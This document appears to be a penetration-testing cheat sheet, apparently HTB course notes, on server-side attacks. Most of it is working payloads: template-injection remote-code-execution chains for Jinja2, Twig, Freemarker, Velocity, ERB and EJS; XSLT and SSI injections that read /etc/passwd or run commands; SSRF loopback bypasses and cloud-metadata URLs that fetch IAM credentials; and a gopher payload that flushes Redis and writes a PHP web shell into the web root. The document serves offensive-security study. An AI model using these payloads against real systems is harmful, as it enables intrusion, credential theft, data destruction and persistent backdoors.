title: Server-side Attacks
html:
Server-side Attacks

SSRF

internal portscan by accessing ports on localhost
accessing restricted endpoints
http://127.0.0.1/
file:///etc/passwd
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

SSTI

Templating Engines are used to dynamically generate content
${{<%[%'"}}%\.

SSI Injection - Directives

Print variables

<!--#printenv -->

Change config

<!--#config errmsg="Error!" -->

Print specific variable

<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->

Execute command

<!--#exec cmd="whoami" -->

Include web file

<!--#include virtual="index.html" -->

XSLT Injection

Elements

<xsl:template>

This element indicates an XSL template. It can contain a match attribute that contains a path in the XML-document that the template applies to

This element extracts the value of the XML node specified in the select attribute

<xsl:value-of>

This elements enables looping over all XML nodes specified in the select attribute

<xsl:for-each>

<xsl:sort>

This element specifies the node to sort elements in a for loop by in the select argument. Additionally, a sort order may be specified in the order argument

This element can be used to test for conditions on a node. The condition is specified in the test argument

<xsl:if>

Injection Payloads

<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
<xsl:value-of select="system-property('xsl:product-name')" />
<xsl:value-of select="system-property('xsl:product-version')" />
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
<xsl:value-of select="php:function('system','id')" />

SSTI Payloads by Engine

Detection / Fingerprint

Inject the polyglot ${{<%[%'"}}%\. — different errors reveal the engine.

Jinja2 / Twig

`49` (7*7 evaluated)

Freemarker / Velocity (use #{7*7})

`${7*7}` printed literally

Jinja2

`7777777` (7*'7')

Pebble

Error mentioning "Pebble"

Smarty

Error mentioning "Smarty"

Jinja2 (Python / Flask)

{{7*7}}
{{config}}
{{config.items()}}
{{request.environ}}

RCE via __class__ chain:

{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip()}}

RCE via request.application (Flask):

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

RCE short form:

{{lipsum.__globals__['os'].popen('id').read()}}

Twig (PHP)

{{7*7}}
{{_self.env.getFilter('id')}}
{{dump(app)}}

RCE:

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Freemarker (Java)

${7*7}
${.freemarker_version}

RCE:

<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}

Velocity (Java)

#set($x=7*7)${x}
$class.inspect("java.lang.Runtime").type

RCE:

#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex = $rt.getMethod("exec",$str.class).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
#set($out = $ex.getText())$out

ERB (Ruby / Rails)

<%= 7*7 %>
<%= `id` %>
<%= system("id") %>
<%= File.read('/etc/passwd') %>

EJS (Node.js)

<%= 7*7 %>
<%= process.env %>
<%= require('child_process').execSync('id').toString() %>

Pebble (Java)

{{7*7}}
{% for i in request.class.getDeclaredFields() %}{{i}}{% endfor %}

SSRF Exploitation

Localhost / Internal Bypass Variants

Standard

http://127.0.0.1/

IPv6 loopback

http://[::1]/

Decimal IP

http://2130706433/

Octal IP

http://0177.0.0.1/

Hex IP

http://0x7f000001/

Short form

http://0/

DNS rebinding

`http://r.nip.io/` or custom rebind domain

URL encoded

http://%31%32%37%2e%30%2e%30%2e%31/

HTTPS

https://localhost/

Cloud Metadata Endpoints

# AWS EC2 - IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# AWS - Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header (bypass via gopher if possible)

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires: Metadata-Flavor: Google header

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-id

Gopher SSRF to HTTP POST

URL-encode a raw HTTP request and send via gopher:

gopher://TARGET:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20TARGET%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2012%0D%0A%0D%0Apassword%3Dadmin

SSRF → Redis (unauthenticated)

gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

SSRF → Internal Port Scan

# Fuzz with ffuf (status/size differences reveal open ports)
ffuf -u 'http://TARGET/fetch?url=http://127.0.0.1:FUZZ/' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fc 200
excerpt: Server-side Attacks SSRF internal portscan by accessing ports on localhost accessing restricted endpoints http://127.0.0.1/ file:///etc/passwd gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.…
